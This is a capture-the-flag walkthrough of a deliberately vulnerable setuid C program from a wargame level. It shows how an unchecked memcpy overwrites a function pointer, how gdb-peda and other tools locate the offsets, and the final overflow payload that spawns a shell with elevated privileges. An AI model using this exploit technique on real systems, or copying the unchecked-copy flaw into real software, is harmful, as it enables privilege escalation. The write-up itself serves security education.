## First look
```sh
level3@io:/levels$ ls -la level03*
-r-sr-x--- 1 level4 level3 5238 Sep 22  2012 level03
-r-------- 1 level3 level3  658 Sep 22  2012 level03.c
```
It appears that there is only 1 way to level 4.
## level03.c
```sh
level3@io:/levels$ file level03
level03: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, not stripped
```
As usual, its a good idea to know what file this actually is.
```C
//bla, based on work by beach
#include <stdio.h>
#include <string.h>
void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}
int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];
        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;
        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);
        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();
        return 0;
}
```
This program introduce the concept of bufferoverflow to overwrite nearby local variable (more specifically, variables below the buffer) . 

## Inside a Stack Frame
insert drawing here

The variable functionpointer is store below the variable buffer.

## Function pointers

### What is a pointer?
Pointer is a variable whose value is an address/reference.
### example
```C
int a = 5;
int b = 5;
int * ptr = &a;
printf("value of a: %d\n", a);
printf("value of a: %d\n", *ptr);
printf("value of b: %d\n", b);
*ptr = 10;
printf("value of a: %d\n", a);
printf("value of a: %d\n", *ptr);
printf("value of b: %d\n", b);
```
Both variable a and b contains the value 5. However, a and b are stored in 2 different memory location. When we assign address of a to ptr. ptr now refers specifically to the memory location of a. When we change the value at the memory with deferencing, the value of a also changes. b still remains unchanged because b is at another memory location.

In this case, functionpointer contains the address of function bad.
functionpointer() would eventually call bad().
However, we can overwrite the value of functionpointer to address of function good.

## memcpy
After looking at the man page for memcpy and how it is used here. We see that memcpy did not restrict length of argv[1] to be copied to buffer. Hence, by copying more than what the buffer[50] can hold, we start to overwrite the memory below it. This is known as *buffer overflow*

## GDB-peda
```sh
level3@io:/levels$ locate peda
/usr/local/peda
/usr/local/peda/LICENSE
/usr/local/peda/README
/usr/local/peda/README.md
/usr/local/peda/lib
/usr/local/peda/master.zip
/usr/local/peda/peda.py
/usr/local/peda/python23-compatibility.md
/usr/local/peda/lib/config.py
/usr/local/peda/lib/nasm.py
/usr/local/peda/lib/shellcode.py
/usr/local/peda/lib/six.py
/usr/local/peda/lib/skeleton.py
/usr/local/peda/lib/utils.py
/usr/share/man/man3/mcheck_pedantic.3.gz
level3@io:/levels$ gdb level03
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from level03...(no debugging symbols found)...done.
(gdb) source /usr/local/peda/peda.py
gdb-peda$ 
```
gdb peda is a GDB plugin that helps greatly in visualization of registers, instructions and stack content. This is a great tool for dynamic analysis.

## Knowing what variable is where
When you `disass main`, it can be very scary to see a long list of assembly code.
When you are experienced enough, you can figure out which offset refers to which variable. I will assume you are beginners hence one of way I usually do is to look out for functions that reference those local variable.

```sh
   0x0804855a <+146>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804855d <+149>:	mov    DWORD PTR [esp+0x4],eax
   0x08048561 <+153>:	mov    DWORD PTR [esp],0x80486c0
   0x08048568 <+160>:	call   0x80483ac <printf@plt>
   0x0804856d <+165>:	mov    eax,DWORD PTR [ebp-0xc]
```
From the source code, we know that `printf` will have a string as argument1 and `functionpointer` as argument2.

The calling convention of x86 for function is to have argument on the top of stack. Then argument 2 below argument 1...

```sh
gdb-peda$ x/s 0x80486c0
0x80486c0:	"This is exciting we're going to %p\n"
```
With gdb examine, we can confirm that argument1 really contain the string.

So `functionpointer` is located at `esp+0x4`. However, I would recommend you to find a reference that uses `ebp` instead of `esp`. This is because the value of `ebp` is constant in a stack frame whereas `esp` can vary. 

```sh
   0x0804856d <+165>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048570 <+168>:	call   eax
```
This is another place that actually reference our functionpointer. Notice `call eax`
From this, we know `functionpointer` is at `ebp-0xc`

We can do the same to find out where is `buffer`.

```sh
   0x08048519 <+81>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804851c <+84>:	add    eax,0x4
   0x0804851f <+87>:	mov    eax,DWORD PTR [eax]
   0x08048521 <+89>:	mov    DWORD PTR [esp+0x4],eax
   0x08048525 <+93>:	lea    eax,[ebp-0x58]
   0x08048528 <+96>:	mov    DWORD PTR [esp],eax
   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
```
From the above snippet, `buffer` is at `ebp-0x58`

Now, we just need to find the distance between `buffer` and `functionpointer`
```py
>>> 0x58-0xc
76
```
From above, we see it actually takes 76 bytes to reach the local variable `functionpointer` instead of 50 bytes.

## testing out
```sh
level3@io:/levels$ gdb level03
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from level03...(no debugging symbols found)...done.
(gdb) run $(python -c "print 76*'A'+'BCDE'")
Starting program: /levels/level03 $(python -c "print 76*'A'+'BBBB'")
This is exciting we're going to 0x45444342

Program received signal SIGSEGV, Segmentation fault.
0x45444342 in ?? ()
```
Here, we used $() to evaluate a bash command before passing as argument 1.
`python -c` allows us to run a string as command. 

0x42 is the letter 'B'. We can see that the program says "we're going to 0x45444342".
The program crashes because 0x45444342 is an illegal address.

## Finding address of good.
There are multiple ways to achieve this, I'm going to list some but the list is not exhausive.

1. gdb print
```sh
(gdb) print &good
$1 = (<text variable, no debug info> *) 0x8048474 <good>
```
2. gdb info
```sh
(gdb) info functions
...
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048474  good
0x080484a4  bad
0x080484c8  main
```
3. objdump
```sh
level3@io:/levels$ objdump -D level03 | grep good
08048474 <good>:
```
4. readelf
```sh
level3@io:/levels$ readelf -s level03 | grep good
    47: 08048474    48 FUNC    GLOBAL DEFAULT   12 good
```
5. radare2
```sh
level3@io:/levels$ r2 level03
 -- Use the 'pR' command to see the source line related to the current seek
[0x080483d0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x080483d0]> afl
0x0804830c    3 48           sym._init
0x0804834c    1 6            loc.imp.__gmon_start__
0x0804835c    1 6            sym.imp.memset
0x0804836c    1 6            sym.imp.__libc_start_main
0x0804837c    1 6            sym.imp.execl
0x0804838c    1 6            sym.imp.memcpy
0x0804839c    1 6            sym.imp.strlen
0x080483ac    1 6            sym.imp.printf
0x080483bc    1 6            sym.imp.puts
0x080483d0    1 33   -> 220  entry0
0x08048400    6 62           sym.__do_global_dtors_aux
0x08048440    4 52           sym.frame_dummy
0x08048474    1 48           sym.good
0x080484a4    1 36           sym.bad
0x080484c8    6 182          sym.main
0x08048580    1 5            sym.__libc_csu_fini
0x08048590    4 90           sym.__libc_csu_init
0x080485ea    1 4            sym.__i686.get_pc_thunk.bx
0x080485f0    4 48           sym.__do_global_ctors_aux
0x08048620    1 28           sym._fini
[0x080483d0]> 
```
## Little Endian
We have crashed the program at `0x45444342` which correspond to "EDCB" instead of "BCDE". The order of the bytes are read from right to left instead of left to right (big endian).
It is important to note the endianess when overwrite values in memory.

## exploit
```sh
level3@io:/levels$ ./level03 $(python -c "print 76*'A'+'\x74\x84\x04\x08'")
This is exciting we're going to 0x8048474
Win.
sh-4.3$ id
uid=1003(level3) gid=1003(level3) euid=1004(level4) groups=1003(level3),1029(nosu)
```
